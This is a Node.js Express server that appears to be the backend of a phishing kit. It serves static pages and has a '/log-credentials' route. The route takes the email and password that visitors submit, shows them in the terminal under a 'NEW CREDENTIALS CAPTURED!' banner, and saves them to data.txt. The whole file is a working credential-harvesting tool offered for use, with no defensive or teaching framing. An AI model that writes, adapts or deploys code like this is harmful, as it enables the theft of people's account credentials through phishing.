const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ANSI color codes for terminal
const colors = {
    reset: '\x1b[0m',
    bright: '\x1b[1m',
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m',
    white: '\x1b[37m',
};

// Route to save credentials
app.post('/log-credentials', (req, res) => {
    const { email, password } = req.body;
    const timestamp = new Date().toISOString();
    const logEntry = `[${timestamp}]\nEmail: ${email}\nPassword: ${password}\n${'='.repeat(50)}\n`;
    
    // Display in terminal with colors and formatting
    console.log('\n' + colors.cyan + '='.repeat(70) + colors.reset);
    console.log(colors.bright + colors.green + '🎯 NEW CREDENTIALS CAPTURED!' + colors.reset);
    console.log(colors.cyan + '='.repeat(70) + colors.reset);
    console.log(colors.yellow + '📧 Email:    ' + colors.white + colors.bright + email + colors.reset);
    console.log(colors.yellow + '🔑 Password: ' + colors.white + colors.bright + password + colors.reset);
    console.log(colors.yellow + '⏰ Time:     ' + colors.white + timestamp + colors.reset);
    console.log(colors.cyan + '='.repeat(70) + colors.reset + '\n');
    
    // Also save to data.txt (optional - comment out if you don't want file logging)
    fs.appendFile('data.txt', logEntry, (err) => {
        if (err) {
            console.error(colors.red + '❌ Error writing to file:' + colors.reset, err);
            res.status(500).json({ success: false, message: 'Failed to log credentials' });
        } else {
            console.log(colors.green + '✅ Saved to data.txt' + colors.reset);
            res.json({ success: true, message: 'Credentials logged successfully' });
        }
    });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log('\n' + colors.bright + colors.blue + '='.repeat(70) + colors.reset);
    console.log(colors.bright + colors.blue + '🚀 Server Started!' + colors.reset);
    console.log(colors.bright + colors.blue + '='.repeat(70) + colors.reset);
    console.log(colors.green + `📡 Server running on: ${colors.white}http://localhost:${PORT}${colors.reset}`);
    console.log(colors.green + `⏰ Started at: ${colors.white}${new Date().toISOString()}${colors.reset}`);
    console.log(colors.yellow + '📝 Waiting for credentials...' + colors.reset);
    console.log(colors.bright + colors.blue + '='.repeat(70) + colors.reset + '\n');
});